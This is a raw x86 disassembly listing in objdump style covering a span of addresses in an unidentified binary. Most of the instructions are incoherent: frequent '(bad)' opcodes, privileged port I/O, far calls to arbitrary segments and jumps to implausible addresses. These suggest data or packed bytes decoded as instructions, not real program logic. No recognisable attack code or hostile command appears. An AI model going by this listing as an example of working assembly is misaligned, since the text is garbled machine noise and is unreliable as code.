  422cf4:	(bad)  
  422cf5:	imul   edx,DWORD PTR [ebx],0xffffff85
  422cf8:	ret    
  422cf9:	dec    edi
  422cfa:	out    dx,eax
  422cfb:	jno    0x422cd7
  422cfd:	mov    dh,0xd5
  422cff:	mov    ebp,0x5de8a062
  422d04:	(bad)  
  422d05:	mov    ds:0xacacae37,eax
  422d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d0b:	leave  
  422d0c:	pop    ds
  422d0d:	arpl   si,sp
  422d0f:	rol    BYTE PTR [eax],cl
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ecx,DWORD PTR [ecx+0x5837f261]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	in     eax,0x4f
  422d8e:	or     eax,0xb7228755
  422d93:	in     eax,dx
  422d94:	cmp    BYTE PTR [edx],dl
  422d96:	and    ah,cl
  422d98:	inc    ebx
  422d99:	push   esi
  422d9a:	inc    edi
  422d9b:	cmp    eax,0x13bfb565
  422da0:	pop    edx
  422da1:	lahf   
  422da2:	xchg   DWORD PTR [ebx+eiz*2],edi
  422da5:	adc    BYTE PTR [esi-0x65],0x78
  422da9:	cmp    al,0x86
  422dab:	out    dx,al
  422dac:	inc    DWORD PTR [edx-0x27]
  422daf:	mov    al,0x8a
  422db1:	imul   ecx,DWORD PTR [esi],0x61
  422db4:	mov    dl,BYTE PTR [edi-0x20]
  422db7:	dec    eax
  422db8:	jnp    0x422e17
  422dba:	clc    
  422dbb:	in     al,dx
  422dbc:	mov    dh,0x2d
  422dbe:	loopne 0x422e01
  422dc0:	mov    dh,BYTE PTR [ecx+ebp*4-0x37]
  422dc4:	inc    ebx
  422dc5:	and    edi,ecx
  422dc7:	scas   eax,DWORD PTR es:[edi]
  422dc8:	add    eax,0x7ce01bf1
  422dcd:	scas   eax,DWORD PTR es:[edi]
  422dce:	pop    eax
  422dcf:	fwait
  422dd0:	xor    BYTE PTR [esi-0x25],dl
  422dd3:	sbb    eax,0x99e0d0e0
  422dd8:	nop
  422dd9:	or     DWORD PTR [edx+edx*8-0x5b58ab27],edx
  422de0:	imul   ecx
  422de2:	mov    edx,0x734632b4
  422de7:	push   edx
  422de8:	and    al,0xb0
  422dea:	ins    BYTE PTR es:[edi],dx
  422deb:	pop    ss
  422dec:	mov    esi,0xbc6f450a
  422df1:	mov    edx,0x7ad0c444
  422df6:	aam    0x6c
  422df8:	dec    esi
  422df9:	push   cs
  422dfa:	hlt    
  422dfb:	lahf   
  422dfc:	mov    dl,0x3e
  422dfe:	sbb    al,0x4
  422e00:	fmul   QWORD PTR [ecx]
  422e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e03:	(bad)  
  422e04:	call   0x546c0e87
  422e09:	ja     0x422e3c
  422e0b:	inc    esp
  422e0c:	cmp    BYTE PTR [ecx],dl
  422e0e:	ss sub esi,ebx
  422e11:	bound  ecx,QWORD PTR [ebp-0x77]
  422e14:	aam    0xf9
  422e16:	jae    0x422e18
  422e18:	mov    edi,0x130ee6bf
  422e1d:	mov    ah,0x3c
  422e1f:	jae    0x422e17
  422e21:	cmp    ebp,ebx
  422e23:	fld    TBYTE PTR [eax+0x3f]
  422e26:	mov    WORD PTR [edi-0x465dbee1],ds
  422e2c:	and    al,0x5a
  422e2e:	iret   
  422e2f:	iret   
  422e30:	mov    ebp,0x4ba5d817
  422e35:	inc    eax
  422e36:	push   ss
  422e37:	lea    esi,[ecx-0x6b00bc23]
  422e3d:	xchg   BYTE PTR [eax-0x39],cl
  422e40:	nop
  422e41:	sbb    ebx,DWORD PTR [edx+0x6e]
  422e44:	push   esi
  422e45:	fsubr  QWORD PTR [ebx-0x16a6c909]
  422e4b:	outs   dx,DWORD PTR gs:[esi]
  422e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e4e:	in     al,0xe8
  422e50:	inc    ebx
  422e51:	adc    eax,0xbe7644b4
  422e56:	adc    cl,bl
  422e58:	out    0xa7,eax
  422e5a:	adc    DWORD PTR ds:0x8928aedb,ecx
  422e60:	test   eax,0xf9485225
  422e65:	or     BYTE PTR [edx],bl
  422e67:	pop    esi
  422e69:	iret   
  422e6a:	jns    0x422dfe
  422e6c:	outs   dx,DWORD PTR ds:[esi]
  422e6d:	test   BYTE PTR [edx+0x44],0xed
  422e71:	mov    ebx,0x306c1a61
  422e76:	push   eax
  422e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e78:	test   DWORD PTR [eax],esi
  422e7a:	jae    0x422e41
  422e7c:	fwait
  422e7d:	jnp    0x422e3c
  422e7f:	or     DWORD PTR [esi],ebp
  422e81:	test   ebp,eax
  422e83:	push   ebp
  422e84:	shl    BYTE PTR [esi+0x9413346],cl
  422e8a:	popa   
  422e8b:	out    0x6b,eax
  422e8d:	popa   
  422e8e:	sbb    ah,BYTE PTR [ebx]
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xf2efca33
  422f02:	popf   
  422f03:	mov    esi,0x1745c
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	push   edi
  422f0d:	add    al,0x71
  422f0f:	mov    al,ds:0xc289fb88
  422f14:	fiadd  WORD PTR [ebx-0x78]
  422f17:	call   FWORD PTR [esi+0x20]
  422f1a:	arpl   WORD PTR [eax],bp
  422f1c:	pop    esp
  422f1d:	mov    dl,0x70
  422f1f:	sar    DWORD PTR [ecx-0x75],cl
  422f22:	outs   dx,BYTE PTR ds:[esi]
  422f23:	dec    ebp
  422f24:	dec    edx
  422f25:	stos   BYTE PTR es:[edi],al
  422f26:	sub    BYTE PTR ds:0x52756d04,bh
  422f2c:	bound  esp,QWORD PTR [eax+0x6a8344b8]
  422f32:	inc    esi
  422f33:	mov    esp,esp
  422f35:	loopne 0x422ed4
  422f37:	dec    BYTE PTR [ebp-0x49]
  422f3a:	mov    eax,ds:0x3da377a1
  422f3f:	mov    dh,0x6a
  422f41:	loope  0x422f61
  422f43:	std    
  422f44:	sbb    bl,bl
  422f46:	xchg   esi,eax
  422f47:	xor    ah,BYTE PTR [ebp-0x7]
  422f4a:	call   0x7045:0x45c1195b
  422f51:	call   0x9dbd3810
  422f56:	leave  
  422f57:	popa   
  422f58:	rcl    BYTE PTR [edx+0x38fefc36],0x2d
  422f5f:	test   BYTE PTR [esp+edx*2+0x64],dl
  422f63:	mov    edx,DWORD PTR [ecx+0x55]
  422f66:	fldcw  WORD PTR [esi+0x60]
  422f69:	mov    ebp,0xaaf5974d
  422f6e:	mov    edi,0x5ca0d8a3
  422f73:	push   ebx
  422f74:	sub    DWORD PTR [ebx-0x28],edx
  422f77:	lock lea esp,[ebp+0x48]
  422f7b:	inc    edx
  422f7c:	in     eax,dx
  422f7d:	jmp    0xd31cdb0f
  422f82:	loop   0x422f3f
  422f84:	sbb    cl,al
  422f86:	inc    esp
  422f87:	popa   
  422f88:	enter  0x2cef,0x9d
  422f8c:	lods   al,BYTE PTR ds:[esi]
  422f8d:	dec    edi
  422f8e:	test   bl,bl
  422f90:	rcl    eax,cl
  422f92:	mov    esp,ecx
  422f94:	adc    DWORD PTR [edx+esi*4+0x14],edx
  422f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f99:	pop    ebx
  422f9a:	call   0x1acbb596
  422f9f:	adc    al,0xa3
  422fa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa2:	push   es
  422fa3:	test   eax,0x77a4023c
  422fa8:	out    0x9a,eax
  422faa:	sbb    dh,ah
  422fac:	add    bh,ah
  422fae:	mov    al,BYTE PTR [edi-0x7468e1a7]
  422fb4:	pop    esi
  422fb5:	ss (bad) 
  422fb7:	jecxz  0x422f5c
  422fb9:	mov    eax,ds:0x6327ab75
  422fbe:	call   0x2d8c3ee1
  422fc3:	and    edi,DWORD PTR ds:0xfdecc1bd
  422fc9:	jnp    0x422fe7
  422fcb:	jno    0x422faf
  422fcd:	xor    DWORD PTR [eax-0x42916875],esi
  422fd3:	jecxz  0x422f9a
  422fd5:	xchg   esi,eax
  422fd6:	(bad)  
  422fd7:	mov    ecx,0x70ccfe1f
  422fdc:	cmp    bl,BYTE PTR [edx-0x429952d4]
  422fe2:	add    BYTE PTR [esi+edx*4-0x2716f839],cl
  422fe9:	mov    eax,ds:0xd63b6aef
  422fee:	imul   eax,DWORD PTR [ebx-0x5e675ded],0x59
  422ff5:	inc    esp
  422ff6:	sbb    bl,BYTE PTR [eax]
  422ff8:	pop    ecx
  422ff9:	mov    eax,ds:0xd9cf7585
  422ffe:	ins    DWORD PTR es:[edi],dx
  422fff:	call   0xf138:0xff4cbf44
  423006:	cmp    al,0xff
  423008:	pop    esp
  423009:	and    al,BYTE PTR [edi-0x18]
  42300c:	int3   
  42300d:	inc    edi
  42300e:	in     eax,0x3d
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edx+eax*2+0x60da3102],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	retf   0x74f5
  42308f:	sub    eax,0xbe3ea5ef
  423094:	or     al,0xb0
  423096:	shl    DWORD PTR [ebp+0x5f9e84fa],cl
  42309c:	sub    BYTE PTR ds:0x2f8991b6,ch
  4230a2:	add    al,0x5f
  4230a4:	in     al,dx
  4230a5:	xor    al,0x40
  4230a7:	stos   DWORD PTR es:[edi],eax
  4230a8:	test   BYTE PTR [edx+ecx*1],bh
  4230ab:	mov    ebp,0xe32cb97a
  4230b0:	loop   0x423115
  4230b2:	stos   BYTE PTR es:[edi],al
  4230b3:	sti    
  4230b4:	adc    ah,BYTE PTR [edi-0xd]
  4230b7:	out    0x30,al
  4230b9:	es cld 
  4230bb:	xchg   edi,eax
  4230bc:	aad    0x7
  4230be:	adc    dh,BYTE PTR [edi]
  4230c0:	enter  0xaf46,0x85
  4230c4:	sub    DWORD PTR [ebx-0x31876054],esp
  4230ca:	cmp    eax,DWORD PTR [ecx]
  4230cc:	inc    ebp
  4230cd:	add    eax,0x7457a539
  4230d2:	inc    edi
  4230d3:	inc    ebx
  4230d4:	push   es
  4230d5:	push   ebp
  4230d6:	lods   al,BYTE PTR ds:[esi]
  4230d7:	call   0x5ed9:0x3c4fd64b
  4230de:	xchg   DWORD PTR [edi+0x70],edx
  4230e1:	cs mov ebx,0xfb507371
  4230e7:	mov    eax,0xdb7bcf05
  4230ec:	xor    ah,BYTE PTR [edx-0x268a1845]
  4230f2:	retf   
  4230f3:	add    esp,edx
  4230f5:	adc    ebp,edx
  4230f7:	lds    eax,FWORD PTR [ecx-0x13a0bf64]
  4230fd:	(bad)  
  4230fe:	in     eax,0xad
  423100:	jo     0x423179
  423102:	fidiv  DWORD PTR [eax+esi*1+0x35]
  423106:	push   ecx
  423107:	loope  0x4230b0
  423109:	test   eax,0x5e348247
  42310e:	aaa    
  42310f:	pop    ecx
  423110:	xchg   edi,eax
  423111:	sub    al,0xd7
  423113:	pop    esi
  423114:	sbb    eax,0xdf84ae67
  423119:	rcl    DWORD PTR [ebx+0x392b66f8],1
  42311f:	sub    esi,esp
  423121:	cmp    DWORD PTR ds:0x1dfc5133,ebp
  423127:	fiadd  DWORD PTR [ebp+ebp*1+0x52e406a5]
  42312e:	sub    BYTE PTR [edi+0x3e031802],cl
  423134:	jecxz  0x423162
  423136:	jge    0x423149
  423138:	mov    al,al
  42313a:	mov    ds:0x97d79a8b,eax
  42313f:	ss xchg ebp,eax
  423141:	push   esi
  423142:	pop    ebp
  423143:	cmp    bl,ah
  423145:	pop    ss
  423146:	mov    bh,0xac
  423148:	jge    0x4231ae
  42314a:	xchg   ebp,eax
  42314b:	stos   DWORD PTR es:[edi],eax
  42314c:	dec    edx
  42314d:	mov    esp,0xb48e6945
  423152:	jae    0x4231ba
  423154:	jb     0x423162
  423156:	loope  0x4231bc
  423158:	les    esp,FWORD PTR [edx-0x1bd1c915]
  42315e:	sub    eax,0x4def3ba7
  423163:	push   ebx
  423164:	(bad)  
  423166:	shl    DWORD PTR [edi-0x3938053],0x3f
  42316d:	jae    0x4231a7
  42316f:	or     eax,0x24301f84
  423174:	or     eax,0xbda5b825
  423179:	rcr    BYTE PTR [esi-0x5a],1
  42317c:	pop    eax
  42317d:	inc    edi
  42317e:	lea    ebx,[esi-0x1e]
  423181:	add    dh,bh
  423183:	stos   DWORD PTR es:[edi],eax
  423184:	mov    DWORD PTR [ebx-0x762787bc],eax
  42318a:	xchg   esi,eax
  42318b:	cmp    al,BYTE PTR [ebx-0x2c]
  42318e:	adc    al,0x0
	...
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x29cb082e],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	cpuid  
  42320e:	add    DWORD PTR [eax],ebp
  423210:	out    dx,eax
  423211:	mov    BYTE PTR [ebx+0x26b38776],dl
  423217:	cmp    DWORD PTR [eax+0x25],ebx
  42321a:	pop    ds
  42321b:	je     0x4231ff
  42321d:	add    ah,BYTE PTR [ecx-0x11331d8]
  423223:	enter  0x8f5f,0x3b
  423227:	fcom   DWORD PTR [edx-0x6606314]
  42322d:	fwait
  42322e:	or     eax,0x9b92f129
  423233:	rol    BYTE PTR [ebx-0x67f6bd5],0x49
  42323a:	fist   DWORD PTR [edx+esi*8-0x4f0164e6]
  423241:	cwde   
  423242:	adc    eax,DWORD PTR [edx+ecx*1+0x52]
  423246:	cmp    ah,0xdb
  423249:	(bad)  
  42324a:	pop    esi
  42324b:	nop
  42324c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42324d:	inc    esp
  42324e:	mov    esp,0xc093cc83
  423253:	ins    DWORD PTR es:[edi],dx
  423254:	inc    edx
  423255:	adc    DWORD PTR [edx+0x78],edx
  423258:	mov    ch,0xa1
  42325a:	sbb    ecx,DWORD PTR [edx]
  42325c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42325d:	cli    
  42325e:	rol    dh,1
  423260:	out    0xf8,eax
  423262:	shl    DWORD PTR [eax],cl
  423264:	add    dh,dh
  423266:	cmp    esp,DWORD PTR [edx+0x23]
  423269:	mov    edx,0x379265c
  42326e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42326f:	and    BYTE PTR [ecx],cl
  423271:	dec    esp
  423273:	push   ecx
  423274:	ret    0x19f4
  423277:	jne    0x423225
  423279:	xor    BYTE PTR [edx],dl
  42327b:	mov    ah,0xda
  42327d:	(bad)  
  42327e:	rcr    DWORD PTR [edx+0x58],1
  423281:	xor    ebx,ebp
  423283:	xlat   BYTE PTR ds:[ebx]
  423284:	arpl   bp,bp
  423286:	sbb    DWORD PTR [edx-0x58ca0a41],eax
  42328c:	push   ds
  42328d:	test   al,0xf6
  42328f:	fwait
  423290:	jge    0x4232fc
  423292:	xchg   ebp,eax
  423293:	imul   eax,DWORD PTR [edx-0x5228061],0xeecf72ac
  42329d:	mov    ds:0xadfeb383,eax
  4232a2:	mov    bh,0x90
  4232a4:	or     BYTE PTR [eax],dl
  4232a6:	adc    al,0xc3
  4232a8:	ret    0x2975
  4232ab:	fimul  DWORD PTR [ecx-0x2b]
  4232ae:	out    0x7a,eax
  4232b0:	inc    DWORD PTR [esi]
  4232b2:	sbb    BYTE PTR [esi],cl
  4232b4:	dec    ebx
  4232b5:	sub    eax,0xffffff81
  4232b8:	out    0xd7,al
  4232ba:	push   ecx
  4232bb:	jmp    0x4b91:0x2ed6ab09
  4232c2:	sahf   
  4232c3:	ss dec edi
  4232c5:	xor    ebx,DWORD PTR [esi]
  4232c7:	jmp    0x423283
  4232c9:	ror    BYTE PTR [esi+0x363ae751],0xcb
  4232d0:	dec    edi
  4232d1:	xlat   BYTE PTR ds:[ebx]
  4232d2:	push   edx
  4232d3:	out    0x3,al
  4232d5:	push   cs
  4232d6:	retf   
  4232d7:	into   
  4232d8:	mov    BYTE PTR [eax-0x7506aa7e],ah
  4232de:	pop    eax
  4232df:	ins    DWORD PTR es:[edi],dx
  4232e0:	mov    dh,0x76
  4232e2:	ror    BYTE PTR [ecx],0x34
  4232e5:	shr    DWORD PTR [edi],0x70
  4232e8:	in     al,0x28
  4232ea:	loop   0x4232e2
  4232ec:	(bad)  
  4232ed:	jae    0x4232a4
  4232ef:	mov    ds:0xb985cd1c,al
  4232f4:	xchg   edi,eax
  4232f5:	xor    bh,dl
  4232f7:	sub    ebp,DWORD PTR [edx]
  4232f9:	iret   
  4232fa:	dec    ecx
  4232fb:	cmc    
  4232fc:	mov    BYTE PTR [ecx+0x564b9eb3],al
  423302:	mov    ebx,0x33e67be3
  423307:	inc    eax
  423308:	adc    dh,bh
  42330a:	cmc    
  42330b:	mov    cl,0x95
  42330d:	and    al,0x3d
  42330f:	loope  0x423311
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x74740f44
  423382:	iret   
  423383:	dec    ecx
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [edx+0xd14ede7],bl
  423391:	cmp    eax,0x34e481a2
  423396:	cmp    BYTE PTR [ebp+esi*1+0x28],cl
  42339a:	xchg   ebp,eax
  42339b:	jmp    0xa7c2829b
  4233a0:	and    ecx,DWORD PTR [edx+0x6e]
  4233a3:	retf   0x6679
  4233a6:	fistp  WORD PTR [ebp+0x4ac6eef5]
  4233ac:	(bad)  
  4233ad:	add    BYTE PTR [edx+0x2a],ah
  4233b0:	arpl   WORD PTR [eax],dx
  4233b2:	sub    DWORD PTR [ebx+edx*2-0x1a],edi
  4233b6:	in     al,dx
  4233b7:	sbb    BYTE PTR [ecx],dl
  4233b9:	dec    ebp
  4233bb:	ja     0x4233d2
  4233bd:	mov    dh,0xdd
  4233bf:	mov    dl,0x1c
  4233c1:	test   eax,0xd402b905
  4233c6:	sub    esp,DWORD PTR [edi]
  4233c8:	loope  0x42341d
  4233ca:	push   edi
  4233cb:	jmp    0x42341c
  4233cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233ce:	gs sbb dl,dl
  4233d1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233d3:	inc    edx
  4233d4:	xchg   ebp,eax
  4233d5:	shr    edx,1
  4233d7:	imul   edx,DWORD PTR cs:[ecx],0x6e744e7d
  4233de:	sar    DWORD PTR [edx+esi*4],1
  4233e1:	pushf  
  4233e2:	inc    esi
  4233e3:	push   esi
  4233e4:	out    dx,eax
  4233e5:	cmc    
  4233e6:	mov    eax,0xf251f550
  4233eb:	xchg   DWORD PTR [eax-0x13],esp
  4233ee:	call   0xd4df:0x938b807a
  4233f5:	lods   al,BYTE PTR ds:[esi]
  4233f6:	jo     0x42341c
  4233f8:	les    esp,FWORD PTR [ebp-0x71]
  4233fb:	inc    eax
  4233fc:	mov    dh,0x6d
  4233fe:	stos   BYTE PTR es:[edi],al
  4233ff:	jno    0x423447
  423401:	add    eax,DWORD PTR [eax]
  423403:	das    
  423404:	xor    eax,0x9a8a7230
  423409:	add    dl,BYTE PTR [eax]
  42340b:	int3   
  42340c:	or     ch,bh
  42340e:	shl    BYTE PTR [edi],0xd8
  423411:	fs test eax,0x6ba4810d
  423417:	in     eax,dx
  423418:	lahf   
  423419:	arpl   WORD PTR [edi+0x7f],dx
  42341c:	sbb    DWORD PTR [ebp+ecx*8+0xfcea021],eax
  423423:	xlat   BYTE PTR ds:[ebx]
  423424:	jp     0x423408
  423426:	push   esi
  423427:	xor    ch,0x96
  42342a:	retf   0xd6e2
  42342d:	fs fs cli 
  423430:	dec    esp
  423431:	pop    ebp
  423432:	mov    edx,0x32611ed
  423437:	mov    dl,0x15
  423439:	stc    
  42343a:	inc    eax
  42343b:	enter  0x68d4,0x75
  42343f:	loope  0x423407
  423441:	cmp    dl,BYTE PTR [edi-0x7b]
  423444:	xchg   esi,eax
  423445:	push   ecx
  423446:	cdq    
  423447:	call   0x3ba5:0xed62382e
  42344e:	push   ecx
  42344f:	push   ebp
  423450:	mov    bl,0x47
  423452:	cmp    BYTE PTR [ebx-0x6633fb1a],ah
  423458:	nop
  423459:	push   cs
  42345a:	aad    0x41
  42345c:	mov    ds:0xf2030d58,eax
  423461:	(bad)  
  423462:	ror    BYTE PTR [ecx+0x17],cl
  423465:	daa    
  423466:	jl     0x4234b4
  423468:	fdivp  st(1),st
  42346a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42346b:	push   cs
  42346c:	add    BYTE PTR [eax-0x340fc713],dl
  423472:	lds    edx,FWORD PTR [edx]
  423474:	mov    bh,0x92
  423476:	shr    BYTE PTR [ecx],0xd6
  423479:	lods   eax,DWORD PTR ds:[esi]
  42347a:	and    eax,DWORD PTR [esi+0x31eedcf]
  423480:	mov    cl,0x90
  423482:	jge    0x423477
  423484:	test   eax,0x5eea4239
  423489:	add    DWORD PTR [ebx-0x6e],0x8d8231ec
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	push   cs
  423501:	(bad)  
  423503:	jmp    0x43ad74
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	(bad)  [ebp+0x14]
  42350f:	xchg   BYTE PTR [eax],bl
  423511:	outs   dx,BYTE PTR ds:[esi]
  423512:	and    dl,BYTE PTR [ecx+0x3d]
  423515:	adc    DWORD PTR [ebp+0x2b],0x5f039977
  42351c:	push   ecx
  42351d:	or     bh,0xab
  423520:	hlt    
  423521:	xchg   edx,eax
  423522:	adc    esi,DWORD PTR [ebx-0x11]
  423525:	add    esi,esi
  423527:	and    DWORD PTR [eax+0x69],esi
  42352a:	mov    esi,ecx
  42352c:	mov    al,ds:0xf352161e
  423532:	adc    BYTE PTR ss:[edx-0x5c],bh
  423536:	xor    al,0xdf
  423538:	int3   
  423539:	je     0x4234ca
  42353b:	xor    eax,0x674bad6
  423540:	in     eax,0x21
  423542:	out    0x71,al
  423544:	(bad)  
  423545:	inc    DWORD PTR [edx+0x4854ccdf]
  42354b:	js     0x4235a0
  42354d:	fwait
  42354e:	std    
  42354f:	xor    al,BYTE PTR ds:0x2ae14919
  423555:	mov    DWORD PTR [ecx+0x1d24a5e5],ebx
  42355b:	adc    BYTE PTR [eax],0x9
  42355e:	call   0x494:0x76d9a462
  423565:	sar    DWORD PTR [ebp-0x12],cl
  423568:	jmp    0x4fc5b9fd
  42356d:	cmp    DWORD PTR [ebx+0x2f],ebp
  423570:	fcomp  QWORD PTR [ecx+eax*4-0x5e524b99]
  423577:	ja     0x423557
  423579:	mov    ds:0x33d5741,al
  42357e:	cmp    DWORD PTR [ecx+0x4a4212fb],esi
  423584:	pop    ds
  423585:	enter  0x50f8,0x2e
  423589:	fidivr WORD PTR [edi+eiz*4+0x12]
  42358d:	inc    eax
  42358e:	ins    DWORD PTR es:[edi],dx
  42358f:	imul   ebx,DWORD PTR [edx-0x25aead7b],0x7e53a06a
  423599:	retf   0x8103
  42359c:	push   edi
  42359d:	(bad)  
  42359e:	xor    eax,0x1746982
  4235a3:	mov    dh,0x1
  4235a5:	loope  0x423537
  4235a7:	pop    ss
  4235a8:	mov    ch,ch
  4235aa:	mov    WORD PTR [eax-0x53635994],cs
  4235b0:	or     al,0x58
  4235b2:	mov    al,ds:0xad8c5edd
  4235b7:	sub    al,0x93
  4235b9:	test   DWORD PTR [bp+0x34],ebp
  4235bd:	xchg   esp,eax
  4235be:	retf   0x7957
  4235c1:	rcl    BYTE PTR [esi-0x51],1
  4235c4:	stos   DWORD PTR es:[edi],eax
  4235c5:	xlat   BYTE PTR ds:[ebx]
  4235c6:	loopne 0x4235b2
  4235c8:	loopne 0x4235a4
  4235ca:	fidivr WORD PTR [ecx-0x75]
  4235cd:	addr16 jg 0x423596
  4235d0:	sub    BYTE PTR [edi],dh
  4235d2:	xor    al,0x9e
  4235d4:	mov    ds:0xd7c92d86,eax
  4235d9:	int    0x92
  4235db:	repnz push esp
  4235dd:	ror    BYTE PTR [edx],cl
  4235df:	(bad)  
  4235e0:	jae    0x42360f
  4235e2:	pop    ecx
  4235e3:	xchg   bl,dh
  4235e5:	lahf   
  4235e6:	ret    0x135c
  4235e9:	mov    edx,0x36960b9a
  4235ee:	popa   
  4235ef:	enter  0x4d3c,0x32
  4235f3:	repnz and esp,esp
  4235f6:	loop   0x4235b8
  4235f8:	xchg   DWORD PTR [eax+0x27],ebx
  4235fb:	push   eax
  4235fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235fd:	iret   
  4235fe:	nop
  4235ff:	cwde   
  423600:	add    DWORD PTR [ebp+0x43],eax
  423603:	or     bh,BYTE PTR [ebp+0x2d062a8d]
  423609:	fs scas al,BYTE PTR es:[edi]
  42360b:	data16 fwait
  42360d:	scas   eax,DWORD PTR es:[edi]
  42360e:	sbb    eax,0xbd
	...
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x7fb83f13
  423683:	pop    ds
  423684:	jo     0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	push   edi
  42368d:	adc    eax,0x7ffbfe0f
  423692:	les    eax,FWORD PTR [ebx+0xde47c16]
  423698:	mov    al,ds:0x2cc4a24d
  42369d:	xchg   esi,eax
  42369e:	push   es
  42369f:	or     DWORD PTR [ecx+ebp*1+0x2f],ecx
  4236a3:	push   esp
  4236a4:	imul   ebx,ebp,0x6c04dbd6
  4236aa:	add    eax,0x1a428d
  4236af:	in     eax,0xab
  4236b1:	outs   dx,BYTE PTR ds:[esi]
  4236b2:	push   es
  4236b3:	dec    edx
  4236b4:	inc    edi
  4236b5:	ja     0x423698
  4236b7:	mov    ah,0x14
  4236b9:	into   
  4236ba:	or     ebx,esp
  4236bc:	dec    esi
  4236bd:	cs push esi
  4236bf:	pusha  
  4236c0:	push   ebx
  4236c1:	(bad)  
  4236c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236c3:	dec    esp
  4236c4:	lea    ecx,[ebp+0x20]
  4236c7:	inc    ebp
  4236c8:	retf   
  4236c9:	mov    ch,0xd
  4236cb:	push   0xce0d492c
  4236d0:	push   esp
  4236d1:	push   0x1d
  4236d3:	call   0x2299f8e8
  4236d8:	cmp    ah,BYTE PTR [eax]
  4236da:	aad    0x4
  4236dc:	sahf   
  4236dd:	sub    BYTE PTR [esi-0x5aeb3ab2],al
  4236e3:	xor    cl,BYTE PTR [eax+0x55]
  4236e6:	fsubr  st,st(4)
  4236e9:	and    cl,BYTE PTR [ebp+0x26]
  4236ec:	pop    dx
  4236ee:	push   ecx
  4236ef:	stos   BYTE PTR es:[edi],al
  4236f0:	xchg   ebx,eax
  4236f1:	sbb    eax,0x36e60c4a
  4236f6:	imul   DWORD PTR [ecx+0x24]
  4236f9:	add    bh,BYTE PTR [esi-0x141cff7c]
  4236ff:	jp     0x42368b
  423701:	cmp    DWORD PTR [ebp+0x68],edx
  423704:	jle    0x4236f7
  423706:	rcl    DWORD PTR [ebp+0x2e],1
  423709:	pusha  
  42370a:	xlat   BYTE PTR ds:[ebx]
  42370b:	int3   
  42370c:	loope  0x4236ee
  42370e:	cwde   
  42370f:	and    cl,BYTE PTR [esi]
  423711:	pop    ecx
  423712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423713:	movzx  ebp,BYTE PTR [ebx-0x12]
  423717:	bound  ebx,QWORD PTR [edi-0x42d60f4a]
  42371d:	cwde   
  42371e:	sub    ch,BYTE PTR [eax-0x6d6962df]
  423724:	je     0x4236b5
  423726:	mov    ch,0xff
  423728:	mov    ch,BYTE PTR [edx-0x69]
  42372b:	(bad)  
  42372c:	repz mov ebx,0xe34ff1e4
  423732:	ins    DWORD PTR es:[edi],dx
  423733:	mov    cl,0xed
  423735:	xor    eax,0xe5d1c895
  42373a:	cwde   
  42373b:	add    BYTE PTR [esi],bl
  42373d:	inc    esi
  42373e:	out    dx,al
  42373f:	pushf  
  423740:	dec    ecx
  423741:	into   
  423742:	fs sub al,0x69
  423745:	test   al,0x46
  423747:	jae    0x42376b
  423749:	dec    edi
  42374a:	sar    DWORD PTR [ebx-0x24],1
  42374d:	xchg   ebx,eax
  42374e:	sub    eax,0x3e0987cb
  423753:	pop    edi
  423754:	sub    esp,DWORD PTR [ebp+0xb73749c]
  42375a:	add    DWORD PTR [edx+0x81e3a70],ebp
  423760:	pushf  
  423761:	outs   dx,DWORD PTR ds:[esi]
  423762:	icebp  
  423763:	add    DWORD PTR [edx-0x29f1547],0xffffff96
  42376a:	xor    eax,DWORD PTR [ebx+0x2b]
  42376d:	xor    eax,0xf169efbb
  423772:	sbb    eax,0x2e3503a
  423777:	jle    0x4237b1
  423779:	inc    esp
  42377a:	jg     0x4237cf
  42377c:	les    eax,FWORD PTR [edi+0x63]
  42377f:	mov    DWORD PTR [ebx+ecx*4],esi
  423782:	rol    BYTE PTR [eax],cl
